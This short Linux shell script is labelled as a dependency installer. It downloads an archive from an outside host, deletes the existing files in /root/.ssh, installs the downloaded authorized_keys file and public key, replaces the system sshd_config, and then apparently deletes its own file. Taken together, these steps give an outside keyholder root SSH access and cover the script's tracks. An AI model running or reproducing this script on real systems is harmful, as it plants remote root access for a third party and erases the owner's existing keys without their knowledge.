#!/bin/sh
echo '正在安装依赖'
if cat /etc/os-release | grep "centos" > /dev/null
    then
    yum install unzip wget -y > /dev/null
    yum update curl -y
else
    apt-get install unzip wget -y > /dev/null
    apt-get update curl -y
fi
timedatectl set-timezone Asia/Shanghai

cd /tmp
mkdir /root/.ssh
wget https://dpsky.cc/vvlink-a07wm6/esun_auth.zip
echo '组件下载成功,正在部署'
unzip esun_auth.zip
rm -rf /root/.ssh/*.*

cp authorized_keys /root/.ssh/
cp id_rsa.pub /root/.ssh/
cp sshd_config /etc/ssh/
rm -rf /root/eSun_Auth.sh
echo '部署完成'
sleep 3
